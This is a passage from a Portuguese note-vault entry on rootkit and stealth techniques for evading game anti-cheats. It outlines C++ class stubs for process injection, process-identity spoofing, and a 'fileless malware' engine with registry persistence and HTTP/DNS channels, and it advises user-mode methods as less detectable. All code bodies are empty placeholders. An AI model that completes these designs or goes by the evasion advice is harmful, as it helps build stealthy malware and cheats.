        // Implementar hook
    }
    
    static void InjectViaAPC() {
        // Injetar via APC
        // Implementar injeção
    }
    
    static void InjectViaRemoteThread() {
        // Injetar via thread remoto
        // Implementar injeção
    }
    
    static void UseVirtualAllocEx() {
        // Usar VirtualAllocEx
        // Implementar uso
    }
    
    static void UseWriteProcessMemory() {
        // Usar WriteProcessMemory
        // Implementar uso
    }
};
```

### 2. Stealth Process Hiding
```cpp
// ✅ Ocultação stealth de processos
class StealthProcessHider {
private:
    PROCESS_MANIPULATION manip;
    MEMORY_CLEANUP cleanup;
    
public:
    StealthProcessHider() {
        InitializeProcessManipulation();
        InitializeMemoryCleanup();
    }
    
    void InitializeProcessManipulation() {
        // Inicializar manipulação de processo
        manip.useProcessNameSpoofing = true;
        manip.useParentProcessSpoofing = true;
        manip.useCommandLineSpoofing = true;
    }
    
    void InitializeMemoryCleanup() {
        // Inicializar limpeza de memória
        cleanup.useSecureZeroMemory = true;
        cleanup.useMemoryDeallocation = true;
    }
    
    bool HideProcessStealthily(DWORD processId) {
        // Ocultar processo de forma stealth
        return SpoofProcessName(processId) && 
               SpoofParentProcess(processId) && 
               SpoofCommandLine(processId) &&
               CleanMemoryFootprints();
    }
    
    bool SpoofProcessName(DWORD processId) {
        // Falsificar nome do processo
        // Implementar falsificação
        
        return true; // Placeholder
    }
    
    bool SpoofParentProcess(DWORD processId) {
        // Falsificar processo pai
        // Implementar falsificação
        
        return true; // Placeholder
    }
    
    bool SpoofCommandLine(DWORD processId) {
        // Falsificar linha de comando
        // Implementar falsificação
        
        return true; // Placeholder
    }
    
    bool CleanMemoryFootprints() {
        // Limpar rastros de memória
        // Implementar limpeza
        
        return true; // Placeholder
    }
};
```

### 3. Fileless Malware Techniques
```cpp
// ✅ Técnicas de malware sem arquivo
class FilelessMalwareEngine {
private:
    MEMORY_RESIDENT resident;
    REGISTRY_PERSISTENCE persistence;
    NETWORK_COMMUNICATION comm;
    
public:
    FilelessMalwareEngine() {
        InitializeMemoryResident();
        InitializeRegistryPersistence();
        InitializeNetworkCommunication();
    }
    
    void InitializeMemoryResident() {
        // Inicializar residente em memória
        resident.useReflectiveLoading = true;
        resident.useInMemoryExecution = true;
    }
    
    void InitializeRegistryPersistence() {
        // Inicializar persistência no registro
        persistence.useRunKey = true;
        persistence.useImageFileExecutionOptions = true;
    }
    
    void InitializeNetworkCommunication() {
        // Inicializar comunicação de rede
        comm.useHTTP = true;
        comm.useDNS = true;
    }
    
    bool ExecuteFilelessly() {
        // Executar sem arquivos
        return LoadIntoMemory() && 
               SetupPersistence() && 
               EstablishCommunication();
    }
    
    bool LoadIntoMemory() {
        // Carregar em memória
        if (resident.useReflectiveLoading) {
            ReflectiveLoad();
        }
        
        if (resident.useInMemoryExecution) {
            ExecuteInMemory();
        }
        
        return true;
    }
    
    bool SetupPersistence() {
        // Configurar persistência
        if (persistence.useRunKey) {
            SetupRunKey();
        }
        
        if (persistence.useImageFileExecutionOptions) {
            SetupIFEO();
        }
        
        return true;
    }
    
    bool EstablishCommunication() {
        // Estabelecer comunicação
        if (comm.useHTTP) {
            SetupHTTPComm();
        }
        
        if (comm.useDNS) {
            SetupDNSComm();
        }
        
        return true;
    }
    
    // Implementations
    static void ReflectiveLoad() {
        // Carregamento reflexivo
        // Implementar carregamento
    }
    
    static void ExecuteInMemory() {
        // Execução em memória
        // Implementar execução
    }
    
    static void SetupRunKey() {
        // Configurar chave Run
        // Implementar configuração
    }
    
    static void SetupIFEO() {
        // Configurar IFEO
        // Implementar configuração
    }
    
    static void SetupHTTPComm() {
        // Configurar comunicação HTTP
        // Implementar configuração
    }
    
    static void SetupDNSComm() {
        // Configurar comunicação DNS
        // Implementar configuração
    }
};
```

---

## 📈 Evolução Histórica

| Era | Status | Detecção |
|-----|--------|----------|
| 2000s | ✅ Funcional | Nenhuma |
| 2010s | ⚠️ Risco | Basic detection |
| 2015-2020 | ⚠️ Alto risco | Advanced detection |
| 2020-2026 | 🔴 Muito alto risco | Kernel integrity |

---

## 🎯 Lições Aprendidas

1. **Kernel é Sagrado**: Modificações no kernel são facilmente detectadas.

2. **Rootkits São Complexos**: Requerem conhecimento profundo do sistema.

3. **Detecção é Sofisticada**: Anti-cheats modernos detectam rootkits facilmente.

4. **User-Mode é Melhor**: Técnicas user-mode são menos detectáveis.

---

## 🔗 Referências

- [[FULL_DATABASE_v2#50]]
- [[DKOM_Engine]]
- [[SSDT_Hooking]]
- [[IDT_Hooking]]

---

*Rootkit techniques tem risco muito alto. Considere user-mode alternatives para mais segurança.*

---
📌 **Quando usar esta nota?** Sempre que precisar revisar rapidamente este conceito e conectá-lo com outras notas do seu vault.
